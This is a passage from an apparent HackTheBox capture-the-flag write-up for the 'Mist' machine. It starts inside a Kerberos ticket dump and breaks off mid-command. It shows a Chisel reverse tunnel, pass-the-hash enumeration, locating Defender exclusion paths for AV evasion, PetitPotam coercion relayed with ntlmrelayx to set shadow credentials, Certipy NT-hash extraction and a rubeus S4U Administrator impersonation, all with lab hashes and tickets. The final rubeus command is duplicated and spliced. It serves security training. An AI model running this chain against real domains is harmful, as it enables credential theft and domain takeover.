geP1rQ/VDfECpUGT6Lk9zU1lgmH6+Y6UqlJ6MnDCgDvuq9OqxAkpcCmGYosfgsbmRPHSR1SCbQr3Ahcox0gU6igboUL95pOdhKxoLk18fOGq8ZfrSw4yDmnJjInYKjBTgJwKOpvqr/gJWl113hs4aDhM+SWNUE+zzODMmdrbnFnGo2yn6Egbguwfbcs5O9vGZFlthOXRqCx4GFtNWcVae/e5ch3DSgVowgSDQnlBNKY6ZtrAppO0I0er3uEtaWemkDEe5hB30yI5RG0CoTYoulujgdEwgc6gAwIBAKKBxgSBw32BwDCBvaCBujCBtzCBtKAbMBmgAwIBF6ESBBDla+pbV9AE4U1bZYfkIP9ioQobCE1JU1QuSFRCohwwGqADAgEBoRMwERsPYnJhbmRvbi5rZXl3YXJwowcDBQBA4QAApREYDzIwMjQxMDIzMTQwNTMyWqYRGA8yMDI0MTAyNDAwMDUzMlqnERgPMjAyNDEwMzAxNDA1MzJaqAobCE1JU1QuSFRCqR0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0Yg==

  ServiceName              :  krbtgt/mist.htb
  ServiceRealm             :  MIST.HTB
  UserName                 :  brandon.keywarp (NT_PRINCIPAL)
  UserRealm                :  MIST.HTB
  StartTime                :  10/23/2024 7:05:32 AM
  EndTime                  :  10/23/2024 5:05:32 PM
  RenewTill                :  10/30/2024 7:05:32 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  5WvqW1fQBOFNW2WH5CD/Yg==
  ASREP (key)              :  72526B95A474632BC57DBEC5C91FA179

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : DB03D6A77A2205BC1D07082740626CC9

```

### Tunnel

It’ll also be incredibly useful to have access to services like SMB and LDAP from my host. Given that the firewall is blocking everything in by 80, I’ll create a tunnel with [Chisel](https://github.com/jpillora/chisel). I’ll upload the binary, and start the server on my host. I’ll connect to it from Mist:

```

PS C:\xampp\htdocs\files> .\chisel.exe client 10.10.14.6:8000 R:socks

```

The server gets the connection:

```

oxdf@hacky$ /opt/chisel/chisel_1.10.0_linux_amd64 server -p 8000 --reverse
2024/10/23 10:20:27 server: Reverse tunnelling enabled
2024/10/23 10:20:27 server: Fingerprint CLmVW0FsdJuLo7mtQQmMoyunlhCb3dSCoQZk1a66lRw=
2024/10/23 10:20:27 server: Listening on http://0.0.0.0:8000
2024/10/23 10:20:57 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

Now I can use tools like `netexec` to enumerate:

```

oxdf@hacky$ sudo proxychains -q netexec smb localhost
SMB         127.0.0.1       445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)

```

### Enumeration

#### SMB

I’ll use the tunnel to check out SMB on both MS01 and the DC:

```

oxdf@hacky$ sudo proxychains -q netexec smb localhost -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 --shares
SMB         127.0.0.1       445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
SMB         127.0.0.1       445    MS01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9 
SMB         127.0.0.1       445    MS01             [*] Enumerated shares
SMB         127.0.0.1       445    MS01             Share           Permissions     Remark
SMB         127.0.0.1       445    MS01             -----           -----------     ------
SMB         127.0.0.1       445    MS01             ADMIN$                          Remote Admin
SMB         127.0.0.1       445    MS01             C$                              Default share
SMB         127.0.0.1       445    MS01             Common Applications READ,WRITE      
SMB         127.0.0.1       445    MS01             IPC$            READ            Remote IPC
oxdf@hacky$ sudo proxychains -q netexec smb 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 --shares
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         192.168.100.100 445    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9 
SMB         192.168.100.100 445    DC01             [*] Enumerated shares
SMB         192.168.100.100 445    DC01             Share           Permissions     Remark
SMB         192.168.100.100 445    DC01             -----           -----------     ------
SMB         192.168.100.100 445    DC01             ADMIN$                          Remote Admin
SMB         192.168.100.100 445    DC01             C$                              Default share
SMB         192.168.100.100 445    DC01             IPC$            READ            Remote IPC
SMB         192.168.100.100 445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.100.100 445    DC01             SYSVOL          READ            Logon server share

```

Nothing interesting as far as share access. The hostname on the DC is DC01. I’ll add both of these to my `/etc/hosts` file:

```
192.168.100.100 DC01
192.168.100.101 MS01

```

#### Creating Machines

A common technique that’s useful to abuse is creating fake machines on the domain, which by default any domain user can do up to ten. Typically I’d query this using something like:

```

Get-AdObject -Identity ((Get-AdDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota

```

Unfortunately, this returns nothing because the PowerShell AD module isn’t installed on this host. Still, I can do this with LDAP queries:

```

PS C:\> $domain = ([ADSI]"LDAP://RootDSE").defaultNamingContext
PS C:\> $searcher = New-Object DirectoryServices.DirectorySearcher
PS C:\> $searcher.SearchRoot = "LDAP://$domain"
PS C:\> $searcher.Filter = "(objectClass=domainDNS)"
PS C:\> $searcher.PropertiesToLoad.Add("ms-ds-machineaccountquota") | Out-Null
PS C:\> $result = $searcher.FindOne()
PS C:\> $result

Path                  Properties                          
----                  ----------                          
LDAP://DC=mist,DC=htb {ms-ds-machineaccountquota, adspath}
PS C:\> $quota = $result.Properties["ms-ds-machineaccountquota"][0]
PS C:\> $quota
0

```

The result here is 0, meaning I can’t add a computer.

I can also check this with `netexec` and the hash collected above:

```

oxdf@hacky$ sudo proxychains -q netexec ldap 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 -M maq
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
LDAP        192.168.100.100 389    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9 
MAQ         192.168.100.100 389    DC01             [*] Getting the MachineAccountQuota
MAQ         192.168.100.100 389    DC01             MachineAccountQuota: 0

```

#### AV / AMSI Evasion

I noted earlier that AMSI blocked my PowerShell from executing. Defender is running on the box:

```

PS C:\> tasklist
...[snip]...
MsMpEng.exe                    848                            0    203,912 K
...[snip]...
NisSrv.exe                    3856                            0      5,424 K
...[snip]...

```

But, Defender typically also catches the simple PHP webshell using `system` (like on [Rabbit](/2022/04/28/htb-rabbit.html#shell-via-php), [Breadcrumbs](/2021/07/17/htb-breadcrumbs.html#forge-jwt), and [Buff](/2020/11/21/htb-buff.html#fighting-with-defender)). Why didn’t it [above](#webshell-pluck-module)?

It’s not uncommon to allow list web folders from AV, and that’s just the case here. If I copy the webshell into `C:\programdata`, it copies, but on trying to access it, Defender kicks in and deletes it:

```

PS C:\> copy \xampp\htdocs\data\modules\notevil\mod0xdf\0xdf.php \programdata\0xdf.php
PS C:\> ls programdata

    Directory: C:\programdata

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         2/20/2024   5:43 AM                Microsoft
d-----         2/20/2024   6:45 AM                Package Cache
d-----         2/20/2024   6:44 AM                Packages
d-----         2/25/2024   5:56 AM                regid.1991-06.com.microsoft
d-----          5/8/2021   1:20 AM                SoftwareDistribution
d-----          5/8/2021   2:36 AM                ssh
d-----         2/20/2024   5:51 AM                USOPrivate
d-----          5/8/2021   1:20 AM                USOShared
-a----        10/23/2024   6:02 AM             35 0xdf.php

PS C:\> cat programdata\0xdf.php
PS C:\> ls programdata

    Directory: C:\programdata

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         2/20/2024   5:43 AM                Microsoft
d-----         2/20/2024   6:45 AM                Package Cache
d-----         2/20/2024   6:44 AM                Packages
d-----         2/25/2024   5:56 AM                regid.1991-06.com.microsoft
d-----          5/8/2021   1:20 AM                SoftwareDistribution
d-----          5/8/2021   2:36 AM                ssh
d-----         2/20/2024   5:51 AM                USOPrivate
d-----          5/8/2021   1:20 AM                USOShared

```

So I’ll want to do anything that needs to avoid AV in `\xampp\htdocs\`. The `files` directory is a nice place as it isn’t subject to a cleanup cron.

After I originally solved Mist, I found [this article](https://blog.fndsec.net/2024/10/04/uncovering-exclusion-paths-in-microsoft-defender-a-security-research-insight/) which shows methods as a regular user to enumerate exclusion paths. They mention a method using Event logs, which works here with PowerShell:

```

PS C:\> Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*Exclusions\Paths*" } | Select-Object -Property TimeCreated, Id, Message | Format-List

TimeCreated : 2/25/2024 5:36:45 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review 
              the settings as this may be the result of malware.
                Old value: 
                New value: HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\xampp\htdocs = 0x0

```

It calls out the `htdocs` directory!

The `MpCmdRun.exe` method confirms:

```

PS C:\> & "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\xampp\htdocs\|*"
Scan starting...
Scan finished.
Scanning C:\xampp\htdocs\|* was skipped.

```

That directory was skipped. If I try to scan another directory, it fails, but doesn’t skip:

```

PS C:\> & "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\programdata\|*"
Scan starting...
CmdTool: Failed with hr = 0x80508023. Check C:\Users\svc_web\AppData\Local\Temp\MpCmdRun.log for more information

```

#### LDAP Signing

LDAP signing in a domain is another thing to check, and it’s not enabled here:

```

oxdf@hacky$ sudo proxychains -q netexec ldap 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 -M ldap-checker
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
LDAP        192.168.100.100 389    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9 
LDAP-CHE... 192.168.100.100 389    DC01             LDAP Signing NOT Enforced!
LDAP-CHE... 192.168.100.100 389    DC01             [-] mist.htb - cannot complete TLS handshake, cert likely not configured

```

### PetitPotam Attack

#### Strategy

With LDAP signing not enabled, I’m going to use the PetitPotam tool to coerce Windows to authenticate back to me as the MS01$ machine account. There are two wrinkle here:
1. The `webclient` service used in PetitPotam isn’t started, so I’ll need to start it.
2. The attack requires a DNS name for where the machine account will authenticate to. Unfortunately, for me, no account I have access to can create DNS records on the domain (which is a non-default configuration, but not an unrealistic one). I’ll use tunneling to target MS01 and have that come back to my host.

Once I overcome these issues, I can have MS01$ authenticate to my host. Catching this auth with Responder would provide a NetNTLMv2 hash, but as the machine accounts typically have very strong random passwords, this won’t provide much value. I can relay this attack to the DC to get access as MS01$ and to make changes to that account. Typically I would use an RBCD attack here with a fake computer like in [Support](/2022/12/17/htb-support.html#shell-as-domainadmin), but as I showed above, I’m not able to add computers to the domain. Instead, I’ll use the LDAP shell in `ntlmrelayx` (from [Impacket](https://github.com/SecureAuthCorp/impacket)) to add a shadow credential to the machine account, allowing me to fully compromise MS01.

#### Enable webclient

This user is not able to enumerate the status of the `webclient` service:

```

PS C:\> sc.exe query webclient 2>&1
[SC] EnumQueryServicesStatus:OpenService FAILED 5:

Access is denied.

```

Still, I can start the service using C# with [EtwStartWebClient.cs](https://gist.github.com/klezVirus/af004842a73779e1d03d47e041115797). I’ll save that file and compile it with `mono` (`apt install mono-mcs`):

```

oxdf@hacky$ mcs EtwStartWebClient.cs /unsafe
oxdf@hacky$ file EtwStartWebClient.exe 
EtwStartWebClient.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections

```

I’ll upload this to Mist and run it:

```

PS C:\xampp\htdocs\files> .\EtwStartWebClient.exe
[+] WebClient Service started successfully

```

There is a cleanup job reverting this very quickly, so I’ll need to run it again when I need it.

#### Tunnel

I’m going to coerce the machine to connect to a host of my choosing by DNS name. Typically, users in a Windows domain are allowed to add DNS records, but that fails here:

```

oxdf@hacky$ sudo proxychains -q /home/oxdf/venv/bin/python /opt/krbrelayx/dnstool.py -u mist.htb\\brandon.keywarp -p DB03D6A77A2205BC1D07082740626CC9 --tcp -dns-ip 192.168.100.100 -a add -r 0xdf.mist.htb -d 10.10.14.6 DC01
[-] Connecting to host...
[-] Binding to host
[!] Could not bind with specified credentials
[!] {'result': 49, 'description': 'invalidCredentials', 'dn': '', 'message': '8009030C: LdapErr: DSID-0C09080B, comment: AcceptSecurityContext error, data 52e, v4f7c\x00', 'referrals': None, 'saslCreds': None, 'type': 'bindResponse'}

```

This means I am currently limited to DC01 and MS01. I’ll start a tunnel on MS01 (I’ll pick an arbitrary high port of 9001) and have it forward to post 80 on my host:

```

PS C:\xampp\htdocs\files> .\chisel.exe client 10.10.14.6:8000 22301:127.0.0.1:80

```

Now I have this setup:

![image-20241023121255589](/img/image-20241023121255589.png)

I’ll test this by running `curl 127.0.0.1:22301` on Mist and seeing that it does hit my webserver.

#### Attack Without Relay

I’m going to use [this PetitPotam POC](https://github.com/topotam/PetitPotam) with both an exe and a Python script. Given the tunnels, I’ll use the Python script. I’m going to run as root to avoid weird Python path / `sudo` interactions, giving it auth for brandon.keywarp, and the target of `MS01@22301/whatever` as the host, port, and a string that doesn’t matter here:

```

oxdf@hacky$ proxychains python /opt/PetitPotam/PetitPotam.py -u brandon.keywarp -hashes :DB03D6A77A2205BC1D07082740626CC9 -d mist.htb 'MS01@22301/whatever' 192.168.100.101 -pipe all
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/opt/PetitPotam/PetitPotam.py:20: SyntaxWarning: invalid escape sequence '\ '
  show_banner = '''

              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe efsr
[-] Connecting to ncacn_np:192.168.100.101[\PIPE\efsrpc]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK
Something went wrong, check error status => SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsarpc]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!

```

It tries a couple attacks, and finds one, hanging while I see this HTTP request at my listening `nc`:

```

OPTIONS /whatever/PIPE/srvsvc HTTP/1.1
Connection: Keep-Alive
User-Agent: Microsoft-WebDAV-MiniRedir/10.0.20348
translate: f
Host: ms01:22301

```

That’s the start of the request I need here.

#### Relay

Now I’m going to relay that auth attempt back to the DC. I’ll use a [fork of Impacket](https://github.com/Tw1sm/impacket/tree/interactive-ldap-shadow-creds) that is currently a [pull request](https://github.com/fortra/impacket/pull/1402) for reasons I’ll explain later. I’ll run `ntlmrelayx` to start listening:

```

oxdf@hacky$ proxychains -q ntlmrelayx.py -debug -t ldaps://192.168.100.100 -i -smb2support -domain mist.htb
Impacket v0.12.0.dev1+20240509.95404.2a65d8d9 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client MSSQL loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections

```

Now, I’ll start the `webclient` and then run PetitPotam just like before. `ntlmrelayx` sees it:

```

[*] HTTPD(80): Connection from 127.0.0.1 controlled, attacking target ldaps://192.168.100.100
[*] HTTPD(80): Authenticating against ldaps://192.168.100.100 as MIST/MS01$ SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000 as MIST/MS01$
[*] All targets processed!
[*] HTTPD(80): Connection from 127.0.0.1 controlled, but there are no more targets left!

```

It’s started an LDAP shell on localhost:11000. I’ll connect:

```

oxdf@hacky$ nc 127.0.0.1 11000
Type help for list of commands

# 

```

`help` gives the full list of commands:

```

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 clear_shadow_creds target - Clear shadow credentials on the target (sAMAccountName).
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
set_shadow_creds target - Set shadow credentials on the target object (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 exit - Terminates this session.

```

Two of these options are added in the fork I mentioned above: `clear_shadow_creds` and `set_shadow_creds`.

If I try to set a shadow cred immediately, it fails:

```

# set_shadow_creds MS01$
Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb
Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108

KeyCredential generated with DeviceID: 587cad29-38f2-f2bf-cd05-503ac9be0b57
Shadow credentials successfully added!
Could not modify object, the server reports insufficient rights: 00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0

```

It says insufficient rights, but that’s because there’s already a cred there. If I clear it and try again, it works:

```

# clear_shadow_creds MS01$
Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb
Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108

Shadow credentials cleared successfully!

# set_shadow_creds MS01$
Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb
Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108

KeyCredential generated with DeviceID: eec2c5be-b695-51d9-bce9-f5c760831e12
Shadow credentials successfully added!
Saved PFX (#PKCS12) certificate & key at path: KJNQDFsA.pfx
Must be used with password: rJptn57fg3n4kIRj7Xnc

```

#### Get MS01$ NTLM Hash

This shadow credential is frequently reset, so I will use it to get the NTLM hash for the machine account. I’ll use [Certipy](https://github.com/ly4k/Certipy) to make a non-password-protected version:

```

oxdf@hacky$ sudo proxychains -q certipy cert -export -pfx KJNQDFsA.pfx -password rJptn57fg3n4kIRj7Xnc -out ms01.pfx                                       
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing PFX to 'ms01.pfx'

```

Now I’ll use it again to get the hash:

```

oxdf@hacky$ proxychains -q certipy auth -pfx ms01.pfx -domain mist.htb -username MS01\$ -dc-ip 192.168.100.100 -ns 192.168.100.100
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: ms01$@mist.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ms01.ccache'
[*] Trying to retrieve NT hash for 'ms01$'
[*] Got hash for 'ms01$@mist.htb': aad3b435b51404eeaad3b435b51404ee:d682d620b887a24491038115b6dc56bb

```

It works!

```

oxdf@hacky$ proxychains -q netexec smb MS01 -u 'ms01$' -H d682d620b887a24491038115b6dc56bb
SMB         192.168.100.101 445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
SMB         192.168.100.101 445    MS01             [+] mist.htb\ms01$:d682d620b887a24491038115b6dc56bb

```

This hash will change regularly (I believe every 24 hours by default), and will be different on each boot.

## Shell as Administrator on MS01

### Get Kerberos Ticket

I can’t do any kind of remote login with this NTLM hash (or shadow credential) for a machine account. But I can use this hash to get a service ticket as the administrator for SMB (CIFS) service.

From the shell as Brandon.Keywarp, I’ll use `rubeus` to get a Kerberos ticket as the machine account:

```

PS C:\xampp\htdocs\files> .\rubeus asktgt /nowrap /user:"ms01$" /rc4:d682d620b887a24491038115b6dc56bb

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: Ask TGT

[*] Got domain: mist.htb
[*] Using rc4_hmac hash: d682d620b887a24491038115b6dc56bb
[*] Building AS-REQ (w/ preauth) for: 'mist.htb\ms01$'
[*] Using domain controller: 192.168.100.100:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBBAwggQMoAMCARKhAwIBAqKCA/4EggP64uKFs6MzJ8I+rG0v8FCoB117w4sHVvFRVfHfxB8OY7p1Yp+X7SI+2CunSOgp6j6QVfnSEzRDGPW63nn0ldeXt+6IioNeqSzTD3Yl9xli76EVIdqYAOD7jnYkRqW3eQ/fMGPWR68OIGvQHadln/Ba+jGlAwxCqJ891SuPfK2xvKQfGg6Zbp0dNSlbtoPQQvQE02eLUqBTjEgb+GC1DfIJJ6sWirqw6Mw66gM42Q7YkOApn5sww+FHrv5cWPQHiOS9CoPATlkPhwID8nDzPQ9Xjup8tYmrebAu+6DJpilglofY9a4AoU9nviVMtu0lMx9B77ORT8/bKlJFP8At2oFfgB9p6/dLS6d8AsCVxrVRfhOoPgiW/1EwVXZVWcwiWJP6FW/CGpc5VhO1Jfb0Bo89W/YzQSdb/GiDXQcw8uDJVCsU3gfPQNvv02zA7TsJhVHKce4Eie7Ffn4aKaxu6yLMwfgFbobPG6f/uqqayIRneplFGDNoWYVWZ4asw55nsrjj66NVzmCK49ICPC0Qi35mErRw4+umI1omzh+6MSv0Y6oN+8T3e9wO+o7tzbd+z5TiLhTfpBqkMvUlVs4oEc9u4zrABbFLvLBiKLDUv4E6J3nlk8pNdhdpEYeqoQ+hNvdtdZoRLC0wL1S7N+2G0BYQt1k4fqw6+q5VUa0KaTqK0DUcj3B0g+lbKf2cyReBBj65Z8GmUCXzfVaZIio873TG6VZdLcoK3TCLn1FsosN1OsSxsc+6/GF7OQ1WMPBl8kfnyIaEqYGAf08y9gVywaB1XPWWFMnysNvYbP6ODJUyyuaAlkzle8SCCKdP2zfVDH/+xVS3ehaoAUsdGmjpBqdZ1d1FPRT/lxBdnRZo19GyRbqbaGpY/UkP5555roeszFozSgRAwuSIoSZiNkkbtnjYm8mYvbs+r0j0m6qzMEtK4Lu9S2E82PAmh7vPiAhIdbDq73UIYbdhVJg3VxQGNqpOq0Up9DVTXs492xrQ2hOsu7HMU/dGJdv9awNTuKojqCy4eXxxMprgfd3STjoacGdZjqZ4vMZ4u/5Y2djyZHU4vSvU7q6s6jT1ngyn0Wa7KhQTn6eA0CW+d+hGHuPOlExdpfVghvXac4+SIkS/fuO+zI2LJImBSl1ODhKGR7SvvAIaYK4L0kWrbMiOR0vdq/CyFkW1TOzOdZiwUCKI21B6JJoq9BVwpJwSggDWX0o3fYRXbjDYnicCoObcZoAKfB1xOeQDNs0dA60LDgugX8gr+ely0WY/KcY/MgwTWjmlG0VenYE26kyWwjVmQvV1PseEG0FhV312N7Qo6/UwYYwnXCoO5kzWm1w0dvnt6aqk9gYLt/yzjkJdBndVHaOBxzCBxKADAgEAooG8BIG5fYG2MIGzoIGwMIGtMIGqoBswGaADAgEXoRIEEMmi9nszm+yraE4k4LTdgjWhChsITUlTVC5IVEKiEjAQoAMCAQGhCTAHGwVtczAxJKMHAwUAQOEAAKURGA8yMDI0MTAyMzE4MDEyOVqmERgPMjAyNDEwMjQwNDAxMjlapxEYDzIwMjQxMDMwMTgwMTI5WqgKGwhNSVNULkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIbWlzdC5odGI=

  ServiceName              :  krbtgt/mist.htb
  ServiceRealm             :  MIST.HTB
  UserName                 :  ms01$ (NT_PRINCIPAL)
  UserRealm                :  MIST.HTB
  StartTime                :  10/23/2024 11:01:29 AM
  :  10/23/2024 9:01:29 PM
  RenewTill                :  10/30/2024 11:01:29 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  yaL2ezOb7KtoTiTgtN2CNQ==
  ASREP (key)              :  D682D620B887A24491038115B6DC56BB

```

I’ll give that ticket back to `rubeus` to request a ticket using `s4u` impersonating the Administrator account to the CIFS service on MS01:

```

PS C:\xampp\htdocs\files> .\rubeus s4u /self /nowrap /impersonateuser:Administrator /altservice:"cifs/ms01.mist.htb" /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0.\rubeus s4u /self /nowrap /impersonateuser:Administrator /altservice:"cifs/ms01.mist.htb" /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBBAwggQMoAMCARKhAwIBAqKCA/4EggP64uKFs6MzJ8I+rG0v8FCoB117w4sHVvFRVfHfxB8OY7p1Yp+X7SI+2CunSOgp6j6QVfnSEzRDGPW63nn0ldeXt+6IioNeqSzTD3Yl9xli76EVIdqYAOD7jnYkRqW3eQ/fMGPWR68OIGvQHadln/Ba+jGlAwxCqJ891SuPfK2xvKQfGg6Zbp0dNSlbtoPQQvQE02eLUqBTjEgb+GC1DfIJJ6sWirqw6Mw66gM42Q7YkOApn5sww+FHrv5cWPQHiOS9CoPATlkPhwID8nDzPQ9Xjup8tYmrebAu+6DJpilglofY9a4AoU9nviVMtu0lMx9B77ORT8/bKlJFP8At2oFfgB9p6/dLS6d8AsCVxrVRfhOoPgiW/1EwVXZVWcwiWJP6FW/CGpc5VhO1Jfb0Bo89W/YzQSdb/GiDXQcw8uDJVCsU3gfPQNvv02zA7TsJhVHKce4Eie7Ffn4aKaxu6yLMwfgFbobPG6f/uqqayIRneplFGDNoWYVWZ4asw55nsrjj66NVzmCK49ICPC0Qi35mErRw4+umI1omzh+6MSv0Y6oN+8T3e9wO+o7tzbd+z5TiLhTfpBqkMvUlVs4oEc9u4zrABbFLvLBiKLDUv4E6J3nlk8pNdhdpEYeqoQ+hNvdtdZoRLC0wL1S7N+2G0BYQt1k4fqw6+q5VUa0KaTqK0DUcj3B0g+lbKf2cyReBBj65Z8GmUCXzfVaZIio873TG6VZdLcoK3TCLn1FsosN1OsSxsc+6/GF7OQ1WMPBl8kfnyIaEqYGAf08y9gVywaB1XPWWFMnysNvYbP6ODJUyyuaAlkzle8SCCKdP2zfVDH/+xVS3ehaoAUsdGmjpBqdZ1d1FPRT/lxBdnRZo19GyRbqbaGpY/UkP5555roeszFozSgRAwuSIoSZiNkkbtnjYm8mYvbs+r0j0m6qzMEtK4Lu9S2E82PAmh7vPiAhIdbDq73UIYbdhVJg3VxQGNqpOq0Up9DVTXs492xrQ2hOsu7HMU/dGJdv9awNTuKojqCy4eXxxMprgfd3STjoacGdZjqZ4vMZ4u/5Y2djyZHU4vSvU7q6s6jT1ngyn0Wa7KhQTn6eA0CW+d+hGHuPOlExdpfVg